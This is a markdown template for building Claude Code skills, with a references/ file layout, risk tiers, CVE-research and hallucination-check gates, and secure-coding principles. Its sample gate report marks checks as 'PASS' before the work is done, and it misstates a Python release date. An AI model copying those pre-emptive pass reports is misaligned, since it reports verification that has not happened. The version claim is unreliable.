# Universal Skill/Agent Template

> **Purpose**: This template provides a language-independent, role-independent structure for creating new Claude AI Skills and Agents. Use this template to maintain consistency across all skills while adapting content to specific domains.

---

## Template Structure

```yaml
---
name: [skill-name-kebab-case]
description: "[2-3 sentence description: What this skill does, when to use it, what problems it solves. Be specific about use cases and primary capabilities.]"
model: [sonnet|opus|haiku]  # Optional: specify AI model
---
```

---

## File Organization & Progressive Disclosure Strategy

### Why Use Progressive Disclosure for ALL Skills?

**Claude Code Performance Benefits**:
- **Optimal Loading**: Main SKILL.md loads 2-4x faster (300-500 lines vs 1000+ lines)
- **Progressive Disclosure**: Reference files loaded only when Claude needs specific details
- **Token Efficiency**: Avoids loading large files into context unnecessarily
- **Better Organization**: Clear separation of essentials vs deep-dive content
- **Scalability**: Easy to add new content without bloating main file

**🚨 MANDATORY: All skills MUST use the references/ structure** (except trivial skills <300 lines)

### Standard Structure for ALL Skills

```
my-skill/
├── SKILL.md                           # Main skill (300-500 lines)
├── references/
│   ├── quick-reference.md            # Commands, API reference, cheat sheets
│   ├── examples/
│   │   ├── security-examples.md      # Extended security code examples
│   │   ├── integration-examples.md   # Integration patterns
│   │   └── advanced-patterns.md      # Advanced implementation patterns
│   ├── compliance/
│   │   ├── gdpr-guide.md            # GDPR implementation details
│   │   ├── hipaa-guide.md           # HIPAA compliance guide
│   │   └── pci-dss-guide.md         # PCI-DSS requirements
│   └── troubleshooting/
│       ├── common-issues.md         # Detailed troubleshooting
│       └── debug-workflows.md       # Step-by-step debug guides
└── README.md                          # Skill overview (for humans)
```

### Creating the references/ Structure

**🚨 STEP-BY-STEP: Creating a New Skill with Progressive Disclosure**

1. **Create Directory Structure**:
   ```bash
   mkdir -p my-skill/references
   touch my-skill/SKILL.md
   ```

2. **Plan Content Distribution**:
   - **Main SKILL.md**: Core concepts, top 3-5 patterns, summaries
   - **references/**: Detailed implementations, full examples, advanced content

3. **Create Reference Files** (minimum recommended):
   ```bash
   touch my-skill/references/advanced-patterns.md
   touch my-skill/references/security-examples.md    # HIGH/MEDIUM risk
   touch my-skill/references/anti-patterns.md
   ```

4. **Write Main SKILL.md First** (300-500 lines):
   - Include frontmatter, overview, core responsibilities
   - Add 3-7 essential implementation patterns with brief code examples
   - Include OWASP/security summary tables (not full examples)
   - Add top 3-5 common mistakes
   - Include condensed pre-deployment checklist
   - **Add clear links** to reference files at relevant sections

5. **Write Reference Files** (no line limits):
   - Complete implementations with full code examples
   - All OWASP categories with detailed mitigations
   - All common mistakes with before/after examples
   - Extended troubleshooting workflows
   - Performance optimization guides

6. **Link References in Main File**:
   ```markdown
   **📚 For complete implementation details**:
   - See `references/advanced-patterns.md`

   **📚 For detailed security examples** (all 10 OWASP categories):
   - See `references/security-examples.md`
   ```

### What to Keep in Main SKILL.md (300-500 lines)

**MUST INCLUDE** in main SKILL.md:
- ✅ Frontmatter (name, description, model)
- ✅ Section 1: Overview (risk level, core expertise)
- ✅ Section 2: Core Responsibilities/Principles
- ✅ Section 4: Implementation Patterns (5-10 key patterns with code)
- ✅ Section 5: Security Standards (SUMMARIZED - link to details in references/)
  - 5.1: Top 3-5 critical vulnerabilities (not all 10)
  - 5.2: OWASP mapping table only (not full examples)
  - 5.3: Input validation overview (1-2 examples, link to more)
  - 5.4: Secrets management essentials
  - 5.5: Error handling essentials
- ✅ Section 8: Common Mistakes (5-10 critical anti-patterns)
- ✅ Section 13: Pre-Deployment Checklist (condensed)
- ✅ Section 14: Summary
- ✅ **References section** pointing to external files

### What to Move to references/ Directory

**MOVE TO REFERENCES**:
- ❌ Section 5.1: Full vulnerability details (10 CVEs) → `references/security-examples.md`
- ❌ Section 5.2: Full OWASP examples for all 10 categories → `references/security-examples.md`
- ❌ Section 6: Full testing guide → `references/testing-guide.md`
- ❌ Section 9: Quick reference → `references/quick-reference.md`
- ❌ Section 10: Integration examples → `references/integration-examples.md`
- ❌ Section 11: Detailed troubleshooting → `references/troubleshooting/`
- ❌ Section 12: Deployment details → `references/deployment-guide.md`
- ❌ Section 15: Full threat modeling (5+ scenarios) → `references/threat-model.md`
- ❌ Section 16: Compliance details → `references/compliance/`

### How to Reference External Files

**In main SKILL.md**, add references like this:

```markdown
## 5. Security Standards (Overview)

### 5.1 Critical Vulnerabilities (Top 3)

[Include 3 most critical vulnerabilities with brief examples]

**📚 For complete vulnerability analysis** (10 CVEs, full exploitation scenarios, detection methods):
- See `references/security-examples.md`

### 5.2 OWASP Top 10 2025 Mapping

| OWASP ID | Category | Risk Level | Quick Mitigation |
|----------|----------|------------|------------------|
| A01:2025 | Broken Access Control | Critical | Authorize every request |
| A02:2025 | Security Misconfiguration | High | Secure defaults, disable debug |
| [... condensed table ...]

**📚 For detailed OWASP guidance** (all 10 categories with code examples):
- See `references/security-examples.md#owasp-top-10-2025`

---

## 9. Quick Reference

**Essential Commands**:
```bash
# Top 5 most common commands
command1 --option
command2 --option
```

**📚 For complete quick reference** (all commands, config templates, keyboard shortcuts):
- See `references/quick-reference.md`

---

## 11. Troubleshooting

### Top 3 Common Issues

[Include 3 most frequent issues with solutions]

**📚 For comprehensive troubleshooting**:
- See `references/troubleshooting/common-issues.md`
- See `references/troubleshooting/debug-workflows.md`

---

## 15. Threat Modeling

### Critical Attack Scenarios (Top 3)

[Include 3 most critical attack scenarios with mitigations]

**📚 For complete threat model** (5+ attack scenarios, STRIDE analysis):
- See `references/threat-model.md`

---

## 16. Compliance

**Applicable Regulations**: GDPR, HIPAA, PCI-DSS

**Quick Compliance Checklist**:
- [ ] Data encryption at rest and in transit
- [ ] Access controls enforced
- [ ] Audit logging enabled
- [... top 10 items ...]

**📚 For detailed compliance implementation**:
- GDPR: See `references/compliance/gdpr-guide.md`
- HIPAA: See `references/compliance/hipaa-guide.md`
- PCI-DSS: See `references/compliance/pci-dss-guide.md`
```

### Example: references/security-examples.md

```markdown
# Security Examples & Vulnerability Analysis

This file contains extended security examples referenced from main SKILL.md.

## 5.1 Domain-Specific Vulnerability Landscape (Full Analysis)

**Research Date**: 2025-01-15

### Vulnerability 1: [CVE-YYYY-XXXXX]
[Full details with code examples, detection, mitigation]

### Vulnerability 2-10: [Continue...]

---

## 5.2 OWASP Top 10 2025 - Detailed Guidance

### A01:2025 - Broken Access Control

**Risk Level for This Domain**: Critical

[Full detailed guidance with multiple code examples]

### A02:2025 - Security Misconfiguration

[Continue for all 10 categories...]
```

### Progressive Disclosure Strategy by Skill Complexity

**🚨 UPDATED GUIDANCE: Use references/ structure for ALL skills by default**

| Skill Complexity | Strategy | Main SKILL.md | References Structure |
|-----------------|----------|---------------|---------------------|
| **Simple (<300 lines)** | Single file OK | 200-300 lines | Optional (but recommended for extensibility) |
| **Standard (300-600 lines)** | **MANDATORY** references/ | 300-500 lines | Basic: security-examples.md, anti-patterns.md |
| **Complex (600-1200 lines)** | **MANDATORY** references/ | 300-500 lines | Organized: security/, patterns/, troubleshooting/ |
| **Very Complex (>1200 lines)** | **MANDATORY** split + categorize | 300-500 lines | Full structure or split into multiple skills |

**Default Minimum References** (for all skills with references/):
- ✅ `references/advanced-patterns.md` - Extended implementation examples
- ✅ `references/security-examples.md` - Detailed security coverage (HIGH/MEDIUM risk)
- ✅ `references/anti-patterns.md` - Complete common mistakes list
- ✅ `references/troubleshooting.md` - Detailed debugging workflows (optional)

### Benefits of Progressive Disclosure

1. **Faster Loading**: Claude loads only main SKILL.md initially (300-500 lines)
2. **On-Demand Details**: Reference files loaded only when Claude needs specific details
3. **Token Efficiency**: Avoids loading 4000-line skills into context
4. **Better Organization**: Easier to maintain and update
5. **Reusable References**: Same compliance guides can be used across multiple skills

### How Claude Code Loads References

**Automatic Loading**:
- Claude Code automatically detects `references/` directory
- Loads reference files **only when mentioned/needed**
- Uses semantic search to find relevant content

**Best Practices**:
- Use descriptive filenames (`gdpr-guide.md` not `doc1.md`)
- Include clear section headers for semantic search
- Link from main SKILL.md with clear context
- Keep reference files focused (one topic per file)

---

### Summary: Progressive Disclosure Requirements

**🚨 MANDATORY FOR ALL NEW SKILLS (effective immediately)**

| Requirement | Rule |
|------------|------|
| **File Structure** | MUST use `references/` directory for all skills >300 lines |
| **Main SKILL.md Size** | MUST be 300-500 lines (strictly enforced) |
| **Minimum References** | MUST include: advanced-patterns.md, security-examples.md (HIGH/MEDIUM risk), anti-patterns.md |
| **Linking** | MUST include clear 📚 links from main file to references |
| **Content Distribution** | Essentials in main file, details in references |
| **Validation** | Gate 0.11 blocks generation if structure violates rules |

**Exemptions**:
- ✅ Simple skills <300 lines (single file acceptable)
- ✅ Trivial utilities with minimal content

**Why This Matters**:
- 2-4x faster Claude Code loading times
- Better developer experience (scan essentials quickly)
- Scalable (add content without bloating main file)
- Proven: appsec-expert (1934→520 lines), async-expert (1249→381 lines), graphql-expert (1076→506 lines), api-expert (958→501 lines) all successfully refactored

---

## 0. Security-First Skill Development Framework

> **CRITICAL**: This section contains mandatory guidance that Claude MUST follow when filling this template for any domain. Read and apply this framework BEFORE completing other sections.

---

## 0.0 Master Validation Checklist

**🚨 EXECUTE BEFORE SKILL GENERATION 🚨**

Claude MUST complete ALL validation gates in order. Any BLOCKING failure stops generation immediately.

### Validation Sequence

```python
validation_gates = [
    {
        "gate": "0.1 Domain Expertise Validation",
        "blocking": True,
        "status": "pending",
        "criteria": "Knowledge level >= intermediate (for HIGH-RISK: expert)"
    },
    {
        "gate": "0.2 Vulnerability Research",
        "blocking": True if risk_level == "HIGH" else False,
        "status": "pending",
        "criteria": "2+ web searches succeed, 5+ CVEs documented (HIGH-RISK only)"
    },
    {
        "gate": "0.3 Code Syntax & API Validation",
        "blocking": True if risk_level in ["HIGH", "MEDIUM"] else False,
        "status": "pending",
        "criteria": "All code syntactically valid. Critical APIs verified via official docs."
    },
    {
        "gate": "0.4 Documentation Link Verification",
        "blocking": False,
        "status": "pending",
        "criteria": "Major features link to official docs. 80%+ patterns have doc links."
    },
    {
        "gate": "0.5 Hallucination Self-Check",
        "blocking": True,
        "status": "pending",
        "criteria": "MANDATORY self-review checklist completed. No invented APIs/configs."
    },
    {
        "gate": "0.9 Technology Version Validation",
        "blocking": True if risk_level in ["HIGH", "MEDIUM"] else False,
        "status": "pending",
        "criteria": "LTS not EOL, Latest version within 12 months"
    },
    {
        "gate": "0.11 File Organization Decision",
        "blocking": True,
        "status": "pending",
        "criteria": "MANDATORY: Must use references/ structure for skills >300 lines. Main SKILL.md must be 300-500 lines."
    },
    {
        "gate": "4.X Code Example Security",
        "blocking": True,
        "status": "pending",
        "criteria": "ALL code examples pass security validation (no hardcoded secrets, no injection)"
    },
    {
        "gate": "5.2 OWASP Coverage Completeness",
        "blocking": True if risk_level == "HIGH" else False,
        "status": "pending",
        "criteria": "All 10 OWASP 2025 categories with code examples (HIGH-RISK only)"
    },
    {
        "gate": "6.X Security Testing Requirements",
        "blocking": True if risk_level == "HIGH" else False,
        "status": "pending",
        "criteria": "3+ security test examples documented (injection, auth, authz)"
    }
]
```

### Execution Protocol

**Claude MUST execute gates in order and report status:**

```
🔍 VALIDATION GATE EXECUTION:

✅ 0.1 Domain Expertise: PASS (knowledge_level: expert)
✅ 0.2 Vulnerability Research: PASS (3 searches succeeded, 7 CVEs documented)
✅ 0.3 Code Syntax & API: PASS (will verify APIs via web search during generation)
⚠️ 0.4 Documentation Links: WARNING (will add doc links during generation)
✅ 0.5 Hallucination Self-Check: PASS (will complete checklist before finalizing)
✅ 0.9 Version Validation: PASS (LTS: Python 3.13 EOL 2028-10, Latest: 3.14 released 2024-10)
✅ 0.11 File Organization: PASS (estimated: 1200 lines, strategy: references/)
⏳ 4.X Code Security: [will validate during generation]
⏳ 5.2 OWASP Coverage: [will validate during generation]
⏳ 6.X Testing: [will validate during generation]

✅ ALL BLOCKING GATES PASSED - Proceeding with skill generation
```

**OR if validation fails:**

```
❌ VALIDATION GATE FAILED: 0.2 Vulnerability Research

Reason: Only 1 web search succeeded (need 2+ for HIGH-RISK)
Failed searches:
  - "FastAPI OWASP CWE weaknesses" → web search unavailable
  - "Python JWT vulnerabilities 2024" → rate limited

⛔ SKILL GENERATION BLOCKED ⛔

Cannot proceed with HIGH-RISK skill without current vulnerability data.

Resolution options:
1. Wait 5-10 minutes (rate limit recovery) and retry
2. Reclassify domain as MEDIUM-RISK (if acceptable - reduced security coverage)
3. Provide manual CVE research before retrying

Task aborted. No partial content generated.
```

### Post-Generation Validation

After skill generation completes, Claude MUST validate:

```
📋 POST-GENERATION VALIDATION:

✅ 0.3 Code Syntax & API: PASS (all code syntactically valid, critical APIs verified)
✅ 0.4 Documentation Links: PASS (85% of patterns have doc links)
✅ 0.5 Hallucination Self-Check: PASS (checklist complete, no invented APIs)
✅ 4.X Code Security: PASS (47 code examples, 0 vulnerabilities)
✅ 5.2 OWASP Coverage: PASS (10/10 categories complete with examples)
✅ 6.X Testing: PASS (5 security test examples included)

✅ SKILL GENERATION COMPLETE - All quality gates passed
```

---

### 0.1 Domain Risk Assessment

**🚨 VALIDATION GATE: Domain Expertise Check 🚨**

**STEP 0: Validate Domain Knowledge (MANDATORY - Execute First)**

Before accepting the task, Claude MUST validate sufficient domain expertise:

```python
def validate_domain_expertise(technology, risk_level):
    """
    Validate Claude has sufficient knowledge to create skill.

    Returns:
        - "expert": Deep knowledge, can create HIGH-RISK skills
        - "intermediate": Good knowledge, can create MEDIUM-RISK skills
        - "limited": Basic knowledge, can create LOW-RISK skills only
        - "none": Insufficient knowledge, CANNOT create skill
    """
    knowledge_assessment = {
        "primary_technology": technology,
        "knowledge_level": assess_knowledge(technology),
        "can_provide_code_examples": True/False,
        "can_research_current_vulnerabilities": True/False,
        "last_training_data_update": "2025-01-XX"
    }

    # BLOCKING CONDITIONS:
    if knowledge_assessment["knowledge_level"] == "none":
        abort_with_error(
            f"❌ INSUFFICIENT EXPERTISE: Cannot create skill for unknown technology '{technology}'"
        )

    if knowledge_assessment["knowledge_level"] == "limited" and risk_level == "HIGH":
        abort_with_error(
            f"❌ EXPERTISE TOO LIMITED: Cannot create HIGH-RISK skill with limited knowledge of '{technology}'"
        )

    if not knowledge_assessment["can_provide_code_examples"]:
        abort_with_error(
            f"❌ CANNOT PROVIDE CODE: Skill requires code examples for '{technology}'"
        )

    return knowledge_assessment
```

**Failure Response (if expertise insufficient):**

```
❌ DOMAIN EXPERTISE VALIDATION FAILED ❌

Technology: [name]
Requested risk level: [HIGH/MEDIUM/LOW]
Claude's knowledge level: [none/limited/intermediate/expert]

Cannot create production-grade skill without adequate domain expertise.

Resolution options:
1. Choose a technology where Claude has expert/intermediate knowledge
2. Provide comprehensive technical documentation for Claude to reference
3. Lower risk classification (if knowledge is limited but acceptable for MEDIUM/LOW)
4. Engage domain expert to review generated skill before use

⛔ Task aborted - No skill content generated ⛔
```

**Success Response (if expertise sufficient):**

```
✅ DOMAIN EXPERTISE VALIDATION PASSED ✅

Technology: [name]
Knowledge level: [intermediate/expert]
Can provide code examples: Yes
Can research vulnerabilities: Yes

Proceeding with skill generation.
```

---

**STEP 1: Determine Domain Risk Level**

Before filling this template, Claude MUST analyze the domain to determine its security risk level:

**HIGH-RISK DOMAINS** (Comprehensive security required):
- Backend APIs, microservices, web applications
- Authentication/authorization systems
- Payment processing, financial services
- Healthcare systems (PHI/HIPAA)
- Identity management, SSO systems
- Data processing with PII
- Infrastructure-as-Code, CI/CD pipelines
- Container orchestration, cloud infrastructure
- Database systems, data storage
- Security tools, cryptographic systems

**MEDIUM-RISK DOMAINS** (Standard security required):
- CLI tools with network access
- Data processing/ETL pipelines
- Desktop applications
- Mobile applications
- DevOps automation scripts
- Monitoring and observability tools
- Code generators, build tools
- Testing frameworks
- Configuration management

**LOW-RISK DOMAINS** (Basic security sufficient):
- Documentation generators (no code execution)
- Simple formatters (text/markdown)
- Static analysis tools (read-only)
- Local development utilities (no network/privileged access)

**INSTRUCTIONS FOR CLAUDE**:
1. **Identify the domain risk level** based on the categories above
2. **Apply the appropriate security depth**:
   - **High-risk**: Complete ALL security sections (5, 15, 16), full OWASP + CWE coverage, 5+ attack scenarios
   - **Medium-risk**: Complete security sections 5 and 13, core vulnerabilities, 3 attack scenarios
   - **Low-risk**: Basic security section 5, input validation, 1-2 attack scenarios
3. **Document your risk assessment** at the start of Section 1

### 0.2 Vulnerability Research Framework

**🚨 CRITICAL VALIDATION GATE - BLOCKING FOR HIGH-RISK DOMAINS 🚨**

---

### Pre-Generation Vulnerability Research Validation

**FOR HIGH-RISK DOMAINS: This is a BLOCKING requirement**

Claude MUST complete vulnerability web searches BEFORE generating skill content. **If searches fail, skill generation MUST be aborted immediately.**

---

#### Vulnerability Research Execution Protocol

**STEP 1: Execute Required Web Searches (HIGH-RISK ONLY)**

```python
required_searches_high_risk = [
    "[technology/framework] CVE 2024 2023 2022",
    "[technology/framework] security vulnerabilities 2024 2023",
    "[technology/framework] OWASP CWE common weaknesses"
]

# Execute all searches
search_results = perform_web_searches(required_searches_high_risk)
```

**STEP 2: Validate Search Results**

**Minimum Success Criteria (HIGH-RISK):**
- ✅ At least **2 out of 3** searches return results (not "unavailable" or "rate limited")
- ✅ Combined results contain minimum **5 documented CVEs/vulnerabilities**
- ✅ CVEs are from **2022-2025** timeframe (current/recent)
- ✅ Each CVE has: ID, description, severity, mitigation code example

**STEP 3: Gate Decision**

```python
# Evaluate results
successful_searches = count_successful_searches(search_results)
total_cves = extract_cves_from_results(search_results)

# BLOCKING GATE FOR HIGH-RISK:
if risk_level == "HIGH":
    if successful_searches < 2:
        return abort_skill_generation(
            reason="Insufficient web search data",
            failed_searches=get_failed_searches(search_results)
        )

    if len(total_cves) < 5:
        return abort_skill_generation(
            reason="Insufficient vulnerability data",
            cve_count=len(total_cves),
            required=5
        )

# Validation passed - proceed
return continue_to_content_generation()
```

---

#### Mandatory Failure Response

**IF web searches fail OR insufficient CVEs found, Claude MUST output this error and STOP:**

```
❌ SKILL GENERATION BLOCKED - VULNERABILITY RESEARCH INCOMPLETE ❌

Risk Level: HIGH
Cannot create HIGH-RISK domain skill without current vulnerability data.

Search Results:
✅ "[technology] CVE 2024 2023 2022" → SUCCESS (4 CVEs found)
❌ "[technology] security vulnerabilities 2024" → FAILED (web search unavailable)
❌ "[technology] OWASP CWE weaknesses" → FAILED (rate limited)

Validation Status:
- Successful searches: 1/3 (need 2+) ❌
- Total CVEs found: 4 (need 5+) ❌

⛔ HIGH-RISK domains require verified CVE research from 2022-2025 ⛔

Resolution options:
1. **Wait 5-10 minutes** (if rate limited) and retry skill generation
2. **Reclassify as MEDIUM-RISK** (if acceptable - reduced security coverage requirements)
3. **Provide manual CVE research** to Claude before retrying
4. **Defer task** until web search service is available

Task aborted. No partial skill content generated.
```

**Success Response (validation passed):**

```
✅ VULNERABILITY RESEARCH VALIDATION PASSED ✅

Risk Level: HIGH
Search Results:
✅ "[technology] CVE 2024 2023" → SUCCESS (5 CVEs)
✅ "[technology] security vulnerabilities 2024" → SUCCESS (3 CVEs)
✅ "[technology] OWASP CWE weaknesses" → SUCCESS (OWASP mapping data)

Validation Status:
- Successful searches: 3/3 ✅
- Total CVEs documented: 8 (exceeds minimum of 5) ✅
- Timeframe: 2022-2025 ✅

Proceeding with skill generation.
```

---

#### Exception Handling for Lower Risk Levels

**MEDIUM-RISK domains:**
- Web search **STRONGLY RECOMMENDED** but not blocking
- **IF searches fail:**
  - Add prominent warning: `⚠️ Vulnerability research limited - recommend manual CVE review before production use`
  - Document known common vulnerabilities from Claude's existing knowledge
  - Reduce CVE requirement: minimum **3** (instead of 5)
  - Clearly mark skill as requiring additional security review

**LOW-RISK domains:**
- Web search **OPTIONAL**
- Can proceed with general security best practices from existing knowledge
- Document standard vulnerability classes (injection, XSS, etc.)
- No specific CVE research required

---

**Claude's Mandatory Status Report:**

After attempting vulnerability research, Claude MUST explicitly state one of:

```
✅ GATE 0.2 PASSED: Vulnerability research complete
   - [X] searches succeeded
   - [Y] CVEs documented from 2022-2025
   - Ready to proceed with HIGH-RISK skill generation
```

OR

```
❌ GATE 0.2 FAILED: Insufficient vulnerability data
   - Only [X] searches succeeded (need 2+)
   - Only [Y] CVEs found (need 5+)
   - ⛔ Cannot proceed with HIGH-RISK skill
   - See resolution options above
```

---

**MANDATORY: Research Domain-Specific Vulnerabilities**

Claude MUST research and document vulnerabilities specific to this domain from the past 2-3 years.

**Research Process**:

1. **Web Search for Recent Vulnerabilities** (2022-2025):
   ```
   Search queries to use:
   - "[technology/framework] CVE 2024 2023"
   - "[technology/framework] security vulnerabilities [year]"
   - "[technology/framework] OWASP CWE common weaknesses"
   - "[technology/framework] security advisories [year]"
   - "[technology/framework] critical security bugs"
   ```

2. **Identify Top 10 Domain-Specific Vulnerabilities**:
   - Document CVE IDs, CWE categories, and descriptions
   - Include real-world examples and attack scenarios
   - Provide mitigation code examples
   - Link to advisories and patches

3. **Map to Security Frameworks**:
   - **OWASP Top 10 2025**: Map domain vulnerabilities to OWASP categories
   - **CWE Top 25**: Identify applicable CWE categories
   - **MITRE ATT&CK**: Map to tactics/techniques (if applicable)
   - **SANS Top 25**: Cross-reference with SANS categories

**TEMPLATE FOR VULNERABILITY DOCUMENTATION** (to be added in Section 5):

```markdown
### 5.1 Domain-Specific Vulnerability Landscape (2022-2025)

**Research Date**: [YYYY-MM-DD]

**Top Domain-Specific Vulnerabilities**:

1. **[Vulnerability Name]** ([CVE-YYYY-XXXXX], [CWE-XXX])
   - **Severity**: [Critical/High/Medium]
   - **Description**: [Brief description]
   - **Attack Scenario**: [How this is exploited]
   - **Affected Versions**: [Versions impacted]
   - **Mitigation**:
     ```[language]
     # ✅ Secure implementation
     [code example]
     ```
   - **Detection**: [How to identify this vulnerability]
   - **References**: [Links to CVE, advisory, patch]

[Repeat for top 10 vulnerabilities]
```

### 0.5 Hallucination Self-Check Framework

**🚨 CRITICAL VALIDATION GATE - BLOCKING FOR ALL SKILLS 🚨**

This gate MUST be completed before finalizing any skill. It prevents hallucinated APIs, configurations, and patterns.

---

#### Pre-Finalization Hallucination Checklist

**Claude MUST complete this checklist before finalizing skill:**

```markdown
## Hallucination Self-Check (MANDATORY)

### Code Examples (ALL must pass)
- [ ] All imports are from real packages (not made up)
- [ ] All API methods exist in documented library version
- [ ] All function calls use correct parameter names and types
- [ ] All configuration options exist in official docs
- [ ] All command-line flags are valid (verified with --help or docs)
- [ ] Code is syntactically valid (can be parsed without errors)
- [ ] No undefined variables referenced
- [ ] Type hints match actual types

### Version Information (ALL must pass)
- [ ] All version numbers verified (LTS, latest, EOL dates)
- [ ] EOL dates are accurate (not guessed)
- [ ] Version features match documented capabilities
- [ ] No features claimed for wrong versions

### Security Information (ALL must pass)
- [ ] All CVE IDs are real (format: CVE-YYYY-XXXXX)
- [ ] CVE descriptions match official databases
- [ ] OWASP categories are accurate (A01-A10:2025)
- [ ] CWE IDs are real (if mentioned)
- [ ] Security best practices are current (not outdated)

### Library/Framework Features (ALL must pass)
- [ ] No made-up API methods
- [ ] No invented configuration options
- [ ] No hallucinated event names
- [ ] No fake middleware/plugin names
- [ ] All patterns use real, documented features

### Documentation (ALL must pass)
- [ ] Links to official docs included for major patterns
- [ ] References are to real resources (not made up)
- [ ] Command examples are valid
- [ ] Configuration examples match real schemas
```

---

#### Verification Tools Protocol

**When uncertain about ANY claim, use these tools:**

```python
verification_protocol = {
    "library_api": {
        "tools": ["WebSearch", "WebFetch"],
        "query_template": "[library] [method_name] official documentation",
        "action": "Verify method exists and signature matches"
    },
    "configuration_options": {
        "tools": ["WebSearch", "WebFetch"],
        "query_template": "[library] configuration options official docs",
        "action": "Verify option exists and valid values"
    },
    "command_flags": {
        "tools": ["WebSearch"],
        "query_template": "[tool] --help documentation",
        "action": "Verify flag exists and syntax is correct"
    },
    "cve_ids": {
        "tools": ["WebSearch"],
        "query_template": "CVE-YYYY-XXXXX NVD database",
        "action": "Verify CVE exists and description matches"
    },
    "version_info": {
        "tools": ["WebSearch"],
        "query_template": "[technology] release history EOL dates",
        "action": "Verify version exists and dates are accurate"
    }
}
```

---

#### Common Hallucination Patterns to Avoid

**NEVER include these in skills:**

```python
hallucination_patterns = [
    {
        "type": "Plausible API",
        "example": "app.add_oauth2_provider()",  # Doesn't exist in FastAPI
        "prevention": "Verify ALL methods via official docs"
    },
    {
        "type": "Invented Config",
        "example": "auto_validation: true",  # Made-up option
        "prevention": "Check official config schema"
    },
    {
        "type": "Wrong Parameters",
        "example": "jwt.encode(secret_key=...)",  # Wrong param name
        "prevention": "Verify exact parameter names"
    },
    {
        "type": "Fake Middleware",
        "example": "AutoAuthMiddleware",  # Doesn't exist
        "prevention": "Verify all middleware names"
    },
    {
        "type": "Non-existent Flags",
        "example": "--security-mode strict",  # Made-up flag
        "prevention": "Verify with --help output"
    }
]
```

---

#### Gate Execution

**Success (all checks pass):**

```
✅ GATE 0.5 PASSED: Hallucination self-check complete
   - All code examples verified
   - All APIs match official documentation
   - All version information accurate
   - All security references valid
   - Ready to finalize skill
```

**Failure (any check fails):**

```
❌ GATE 0.5 FAILED: Hallucination detected

Issues found:
- [ ] Line 234: jwt.encode() uses wrong parameter name (secret_key → key)
- [ ] Line 456: AutoAuthMiddleware does not exist
- [ ] Line 789: Configuration option 'auto_validate' is not real

⚠️ MUST FIX before finalizing skill

Actions:
1. Verify correct API signatures via WebSearch
2. Replace hallucinated content with verified alternatives
3. Re-run self-check checklist
```

---

### 0.4 Documentation Link Requirements

**Non-blocking but strongly recommended for all skills.**

Every major implementation pattern SHOULD include:
- Link to official documentation
- Link to security guidance (if applicable)
- Link to OWASP/CVE references (for security patterns)

**Format:**
```markdown
### Pattern X: [Pattern Name]

[Implementation code...]

**References:**
- Official docs: https://...
- Security guide: https://...
```

---

### 0.6 Security Coverage Requirements by Risk Level

**HIGH-RISK DOMAINS - MANDATORY COVERAGE**:

**MUST INCLUDE**:
- ✅ **Section 5.1**: Domain vulnerability research (top 10 vulnerabilities from 2022-2025)
- ✅ **Section 5.2**: OWASP Top 10 2025 compliance matrix (all 10 categories)
- ✅ **Section 5.3**: CWE Top 25 coverage (applicable categories)
- ✅ **Section 5.4**: Input validation framework (multi-layer)
- ✅ **Section 5.5**: Secrets management (environment variables, KMS)
- ✅ **Section 5.6**: Cryptography standards (if applicable)
- ✅ **Section 5.7**: Authentication/authorization patterns (if applicable)
- ✅ **Section 6.1**: Security testing (SAST, DAST, dependency scanning, fuzzing)
- ✅ **Section 6.2**: Property-based testing
- ✅ **Section 6.3**: Security test examples (auth bypass, injection, authz)
- ✅ **Section 6.4**: Comprehensive observability (logs, metrics, tracing)
- ✅ **Section 8**: Security anti-patterns (5+ examples)
- ✅ **Section 13**: Pre-deployment security checklist (comprehensive)
- ✅ **Section 15**: Threat modeling with 5+ attack scenarios
- ✅ **Section 16**: Compliance requirements (if applicable)

**MEDIUM-RISK DOMAINS - STANDARD COVERAGE**:

**MUST INCLUDE**:
- ✅ **Section 5.1**: Domain vulnerability research (top 5 vulnerabilities)
- ✅ **Section 5.2**: Core OWASP 2025 categories (A01 Access Control, A02 Misconfiguration, A03 Supply Chain, A05 Injection, A07 Authentication)
- ✅ **Section 5.3**: Input validation framework
- ✅ **Section 5.4**: Secrets management
- ✅ **Section 6.1**: Security testing (SAST, dependency scanning)
- ✅ **Section 6.4**: Structured logging and metrics
- ✅ **Section 8**: Security anti-patterns (3+ examples)
- ✅ **Section 13**: Security checklist (standard)
- ✅ **Section 15**: 3 attack scenarios

**STRONGLY RECOMMEND**:
- Property-based testing
- DAST/fuzzing
- Threat modeling

**LOW-RISK DOMAINS - BASIC COVERAGE**:

**MUST INCLUDE**:
- ✅ **Section 5**: Basic input validation
- ✅ **Section 5**: No hardcoded secrets
- ✅ **Section 8**: Common mistakes (2+ examples)
- ✅ **Section 13**: Basic checklist

**RECOMMEND**:
- Error handling patterns
- Basic testing guidance

### 0.4 Secure-by-Default Code Generation Principles

**ALL CODE EXAMPLES IN THIS SKILL MUST DEMONSTRATE**:

**MANDATORY (ALL RISK LEVELS)**:
- ✅ **Input Validation**: Validate at all trust boundaries
- ✅ **Output Encoding**: Prevent injection attacks
- ✅ **Secrets Management**: Never hardcode credentials (use environment variables/KMS)
- ✅ **Error Handling**: Safe error messages (no information leakage)
- ✅ **Type Safety**: Leverage type systems for correctness
- ✅ **Logging**: Structured logging with context (no PII/secrets in logs)

**STRONGLY RECOMMENDED (HIGH/MEDIUM RISK)**:
- ✅ **Parameterized Queries**: Never string concatenation for SQL/NoSQL
- ✅ **Least Privilege**: Minimal permissions required
- ✅ **Resource Limits**: Prevent DoS (timeouts, rate limits, max size)
- ✅ **Defense in Depth**: Multiple security layers
- ✅ **Safe Defaults**: Secure by default, opt-in for permissive modes
- ✅ **Audit Logging**: Security events, authentication attempts, authorization failures

**FOR HIGH-RISK DOMAINS ONLY**:
- ✅ **Cryptography**: Industry-standard algorithms (AES-256-GCM, Argon2id, TLS 1.3+)
- ✅ **CSRF Protection**: For web applications
- ✅ **XSS Prevention**: Context-aware output encoding
- ✅ **Authentication**: Multi-factor, secure session management
- ✅ **Authorization**: RBAC/ABAC, principle of least privilege
- ✅ **Security Headers**: CSP, HSTS, X-Frame-Options, etc.

### 0.5 Error Handling Philosophy

**INSTRUCTIONS FOR CLAUDE**: Choose error handling strategy based on domain conventions.

**Result/Option Types** (STRONGLY RECOMMENDED for):
- Rust, OCaml, Haskell, F#
- New TypeScript/JavaScript codebases
- Functional programming paradigms
- Systems where errors are expected control flow

**Example**:
```typescript
// ✅ Result type for expected errors
type Result<T, E> = { ok: true; value: T } | { ok: false; error: E };

function parseUser(data: unknown): Result<User, ValidationError> {
  // Validation logic
}
```

**Exceptions** (ACCEPTABLE for):
- Python, Java, C#, Ruby
- Frameworks that use exceptions idiomatically
